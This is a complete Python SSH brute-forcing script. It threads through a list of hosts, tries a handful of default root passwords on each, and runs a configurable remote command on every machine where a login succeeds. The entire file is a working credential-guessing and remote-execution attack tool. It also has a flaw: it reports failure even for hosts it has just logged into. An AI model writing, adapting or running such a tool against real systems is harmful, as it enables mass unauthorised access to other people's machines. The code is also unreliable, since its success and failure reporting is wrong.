import threading
import paramiko
import sys

# Command to be executed on clients
payload = "uname"

# Credentials
passwords = ['root', 'toor', 'admin', 'password']
username = 'root'


def connect_to_client(client):
    # Strip newlines from client names
    client = client.strip()

    # Create SSH client object
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Attempt to connect to SSH client with each password in turn
    for password in passwords:
        try:
            ssh.connect(client, username=username, password=password, timeout=10)
            print(f"\033[32m[+] {client}\033[0m")

            # Execute uname command on remote system
            stdin, stdout, stderr = ssh.exec_command(payload)
            print(stdout.read())

            ssh.close()
            break

        except Exception as e:
            pass

    # If all password attempts failed, print error message
    print(f"\033[31m[-] {client}\033[0m")


if __name__ == '__main__':
    # Get name of file containing list of SSH clients from command line argument
    if len(sys.argv) != 2:
        print("Usage: ssh_bruter.py <file_name>")
        sys.exit(1)

    file_name = sys.argv[1]

    # Open file containing list of SSH clients
    with open(file_name, 'r') as f:
        clients = f.readlines()

    # Create a thread for each client and start the threads
    threads = []

    for client in clients:
        t = threading.Thread(target=connect_to_client, args=(client,))
        threads.append(t)
        t.start()

    # Wait for all threads to complete before exiting
    for t in threads:
        t.join()
